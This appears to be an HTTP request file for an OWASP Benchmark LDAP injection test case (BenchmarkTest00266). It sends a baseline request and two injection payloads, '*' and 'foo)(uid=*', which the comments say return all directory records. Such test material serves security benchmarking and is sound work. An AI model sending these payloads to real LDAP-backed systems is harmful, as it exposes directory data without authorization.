# Baseline - returns 1 record (MS Bar)
POST /benchmark/ldapi-00/BenchmarkTest00266
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00266=

# LDAP Injection - returns ALL 3 records (information disclosure)
POST /benchmark/ldapi-00/BenchmarkTest00266
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00266=*

# Alternative injection - filter manipulation
POST /benchmark/ldapi-00/BenchmarkTest00266
Content-Type: application/x-www-form-urlencoded

BenchmarkTest00266=foo)(uid=*